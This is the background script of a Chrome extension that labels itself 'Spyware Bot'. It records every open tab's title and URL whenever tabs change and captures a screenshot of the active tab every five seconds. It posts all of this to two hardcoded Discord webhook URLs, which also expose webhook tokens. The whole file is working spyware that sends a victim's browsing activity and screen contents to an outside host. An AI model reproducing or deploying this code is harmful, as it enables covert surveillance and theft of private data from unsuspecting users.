// Define webhook URLs
const tabsWebhookURL = 'https://discord.com/api/webhooks/1287925616020295794/C48HveFoTgjMOLWbYEtZxm_x9MDkIgrecuopasQL7zS5Kt2dRe1ORH5t3rMORoTSZkXv';
const tabCaptureWebhookURL = 'https://discord.com/api/webhooks/1287925392354578483/SQwbyli4M-_l6pIwpKdDe6ZA6JusPpyZFJhIfUqFinhMqrp15LiDouYqTKyOCm7f-MkU'; // Screenshot webhook

// Variable to track the previous state of tabs
let previousTabState = [];

// Function to send data to Discord webhook
function sendToDiscord(webhookURL, data, title) {
  const currentTime = new Date().toLocaleString();
  fetch(webhookURL, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      username: 'Spyware Bot',
      embeds: [{
        title: `${title} at ${currentTime}`, // Add a single timestamp for the entire webhook
        description: data,
        color: 15158332 // Red color
      }]
    }),
  });
}

// Function to send the screenshot and the active tab info to the specified webhook
function sendScreenshotWithActiveTab() {
  chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
    const activeTab = tabs[0]; // Get the active tab
    if (activeTab && activeTab.url && activeTab.title) {
      // Capture the active tab's screenshot
      chrome.tabs.captureVisibleTab(null, {format: 'png'}, function(dataUrl) {
        if (dataUrl) {
          // Convert dataUrl to Blob
          fetch(dataUrl)
            .then(res => res.blob())
            .then(blob => {
              let formData = new FormData();
              formData.append('file', blob, 'screenshot.png');
              
              // Include active tab info in the form data
              let activeTabInfo = `**Active Tab**: [${activeTab.title}](${activeTab.url})`;
              formData.append('payload_json', JSON.stringify({
                username: 'Spyware Bot',
                embeds: [{
                  title: `Screenshot and Active Tab at ${new Date().toLocaleString()}`,
                  description: activeTabInfo,
                  color: 15158332
                }]
              }));
              
              // Send screenshot with active tab info
              fetch(tabCaptureWebhookURL, {
                method: 'POST',
                body: formData
              })
              .then(response => {
                if (response.ok) {
                  console.log('Screenshot and active tab info sent!');
                } else {
                  console.error('Failed to send screenshot and active tab info.');
                }
              })
              .catch(error => {
                console.error('Error:', error);
              });
            })
            .catch(error => {
              console.error('Error processing screenshot:', error);
            });
        } else {
          console.error('Failed to capture screenshot.');
        }
      });
    }
  });
}

// Function to compare two arrays of tab information
function hasTabsChanged(newTabs) {
  if (newTabs.length !== previousTabState.length) {
    return true; // Number of tabs has changed
  }
  for (let i = 0; i < newTabs.length; i++) {
    if (newTabs[i].url !== previousTabState[i].url || newTabs[i].title !== previousTabState[i].title) {
      return true; // URL or title of a tab has changed
    }
  }
  return false;
}

// Capture all open tabs and send their info to the webhook with the event type (Created, Updated, Removed)
function captureAllTabs(eventType, changedTab) {
  chrome.tabs.query({}, function(tabs) {
    let tabInfo = tabs.map(tab => `- [${tab.title}](${tab.url})`); // List each tab with a clickable link

    // Check if tabs have changed before sending to the webhook
    if (hasTabsChanged(tabs)) {
      const updatedInfo = `**Event: ${eventType}**\n**Changed Tab**: [${changedTab.title}](${changedTab.url})\n\n**Current Open Tabs**:\n${tabInfo.join('\n')}`;
      sendToDiscord(tabsWebhookURL, updatedInfo, `Tabs Changed`);
      previousTabState = tabs; // Update the previous state
    }
  });
}

// Listen for tab events (created, removed, or updated) and capture all open tabs
chrome.tabs.onCreated.addListener(function(tab) { captureAllTabs('Tab Created', tab); });
chrome.tabs.onRemoved.addListener(function(tabId, removeInfo) {
  chrome.tabs.get(tabId, function(tab) {
    captureAllTabs('Tab Removed', tab || {title: 'Unknown', url: 'N/A'}); // Handle case when tab info is unavailable
  });
});
chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
  if (changeInfo.status === "complete") {
    captureAllTabs('Tab Updated', tab);
  }
});

// Capture tab screenshots with active tab info every 5 seconds
setInterval(sendScreenshotWithActiveTab, 5000);

// Initially capture all open tabs when the extension loads
chrome.tabs.query({}, function(tabs) {
  previousTabState = tabs;
  captureAllTabs('Initial Load', {title: 'N/A', url: 'N/A'});
});
